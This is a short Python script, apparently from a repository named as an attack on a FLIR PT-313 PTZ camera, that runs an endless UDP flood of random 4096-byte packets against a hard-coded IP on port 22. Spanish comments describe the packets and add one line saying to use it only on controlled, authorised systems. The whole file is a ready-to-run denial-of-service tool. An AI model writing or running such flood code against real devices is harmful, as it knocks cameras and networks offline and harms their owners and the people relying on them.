# Ataque-a-la-C-mara-PTZ-Marca-FLIR-Modelo-PT-313-con-Firmware-1.4.3.2
import socket
import random

def udp_flood(ip, port=22):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    print(f"Starting UDP flood attack on {ip}:{port}. Press Ctrl+C to stop.")
    
    try:
        while True:
            # Generar un paquete aleatorio de 4096 bytes
            packet = random._urandom(4096)
            sock.sendto(packet, (ip, port))
            
            # Imprimir información sobre el paquete enviado
            print(f"Packet sent to {ip}:{port}")
    except KeyboardInterrupt:
        print("\nAttack stopped.")
    except Exception as e:
        print(f"Error: {e}")

# Usar en sistemas controlados y con autorización
udp_flood("192.168.250.116", 22)  # Cambia la IP a la del servidor objetivo
